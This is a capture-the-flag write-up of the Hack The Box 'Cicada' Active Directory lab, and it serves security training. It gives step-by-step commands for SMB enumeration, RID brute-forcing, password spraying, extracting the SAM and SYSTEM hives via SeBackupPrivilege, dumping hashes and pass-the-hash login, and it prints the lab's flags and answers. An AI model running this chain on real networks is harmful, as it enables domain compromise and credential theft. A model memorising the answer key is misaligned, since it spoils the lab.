---
title: "HTB: Cicada"
description: "Hack The Box - Cicada Writeup (Easy Windows Active Directory - SMB, LDAP, SeBackupPrivilege, Secretsdump)"
tags: [htb, active-directory, smb, ldap, windows, privilege-escalation, pass-the-hash, evil-winrm, easy]
---

# Hack The Box: Cicada

**Difficulty:** Easy  
**OS:** Windows (Domain Controller - Windows Server 2022)  
**Domain:** `cicada.htb`  
**Primary Vectors:** Anonymous SMB Share, RID Brute-Forcing, Leaked Credentials in LDAP Metadata, `SeBackupPrivilege` Privilege Escalation

---

## Overview

Cicada is an Easy Windows Active Directory machine. Enumeration begins with guest/anonymous SMB access to discover an HR share, followed by RID brute-forcing with `netexec` (`nxc`) to reveal valid domain usernames. Exploiting default credentials and searching LDAP descriptions exposes additional domain credentials. Initial shell access via `Evil-WinRM` grants user access, while `SeBackupPrivilege` allows extraction of the SAM and SYSTEM registry hives to dump the local Administrator NTLM hash for full root compromise.

---

## Task Breakdown

### Task 1: Guest SMB Access
**Question:** What is the name of the non-default SMB share that is readable with guest access on Cicada?

```bash
# Method 1: Using smbmap
smbmap -H 10.129.231.149 -u guest -p ""

# Method 2: Using netexec (nxc)
nxc smb 10.129.231.149 -u guest -p "" --shares
```

::: details Answer
`HR`
:::

---

### Task 2: HR Share Content
**Question:** What is the name of the file found in the `HR` share?

```bash
smbclient //10.129.231.149/HR -N
ls
```

::: details Answer
`Notice from HR.txt`
:::

---

### Task 3: Default Password User
**Question:** Which user account is still using the company default password?

```bash
# 1. Enumerate usernames using RID brute-forcing via netexec
nxc smb 10.129.231.149 -u guest -p '' --rid-brute > users.txt

# 2. Test each username against the default password found in 'Notice from HR.txt'
nxc smb 10.129.231.149 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
```

::: details Answer
`michael.wrightson`
:::

---

### Task 4: Credentials Leaked in Active Directory Metadata
**Question:** Which user has left their password in Active Directory metadata?

```bash
nxc ldap 10.129.231.149 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

**LDAP Output:**
```text
LDAP        10.129.231.149  389    CICADA-DC        [*] Enumerated 8 domain users: cicada.htb
LDAP        10.129.231.149  389    CICADA-DC        -Username-          -Description-
LDAP        10.129.231.149  389    CICADA-DC        david.orelious      Just in case I forget my password is aRt$Lp#7t*VQ!3
```

::: details Answer
`david.orelious`
:::

---

### Task 5: Development Share Script
**Question:** What is the name of the PowerShell script located in the `DEV` share?

```bash
smbclient //10.129.231.149/DEV -U 'david.orelious%aRt$Lp#7t*VQ!3'
smb: \> ls
```

::: details Answer
`Backup_script.ps1`
:::

---

### Task 6: Plaintext Credential Extraction from Backup Script
**Question:** What is the `emily.oscars` user's password?

```bash
smb: \> get "Backup_script.ps1"
cat Backup_script.ps1
```

**Script Content:**
```powershell
$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
```

::: details Answer
`Q!3@Lp#M6b*7t*Vt`
:::

---

### Task 7: User Shell & Flag
**Question:** Submit the flag located in the `emily.oscars` user's home directory.

```bash
evil-winrm -i 10.129.231.149 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> type user.txt
```

::: details Answer
`21c4cf7c5bfee40efe260b7567770a92`
:::

---

### Task 8: Dangerous Privilege Escalation Vector
**Question:** What dangerous privilege does the `emily.oscars` user have associated with their account?

```powershell
whoami /priv
```

```text
Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
```

::: details Answer
`SeBackupPrivilege`
:::

::: tip Why SeBackupPrivilege is Critical
`SeBackupPrivilege` allows a user to **bypass all Access Control Lists (ACLs)** and read any file on the operating system.

On a Domain Controller, this privilege enables an attacker to copy:
1. **`NTDS.dit`**: The Active Directory database containing hashes for all domain users.
2. **`SYSTEM` & `SAM` Registry Hives**: Containing local secrets and the SysKey required to decrypt local SAM hashes.
:::

---

### Task 9: Dumping Hashes & Administrator Access
**Question:** What is the Administrator user's NTLM hash?

1. **Save SAM and SYSTEM registry hives using WinRM:**
   ```powershell
   reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv /y
   reg save HKLM\SAM C:\Windows\Temp\sam.hiv /y 
   ```
2. **Download files to Kali Linux:**
   ```powershell
   cd C:\Windows\Temp
   download system.hiv 
   download sam.hiv 
   ```
3. **Extract hashes with Impacket:**
   ```bash
   impacket-secretsdump -sam sam.hiv -system system.hiv LOCAL
   ```
   **Output:**
   ```text
   [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
   Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
   ```

::: details Answer
`2b87e7c93a3e8a0ea4a581937016f341`
:::

---

## Root Flag Capture

Use **Pass-The-Hash** authentication with `Evil-WinRM` to log in as `Administrator`:

```bash
evil-winrm -i 10.129.231.149 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
cd C:\Users\Administrator\Desktop
type root.txt
```

::: details Root Flag
`712c35bb52c25078fd29fe64d00277d5`
:::

---

## Summary & Key Takeaways

1. **Restrict Anonymous SMB & RPC:** Always restrict anonymous share enumeration and RID brute forcing.
2. **Sanitize LDAP Metadata:** Never store passwords or sensitive notes in user account descriptions.
3. **Audit Script Credentials:** Passwords hardcoded in backup scripts inside network shares pose severe risk.
4. **Restrict Backup Privileges:** Treat `SeBackupPrivilege` as equivalent to full administrative privileges.
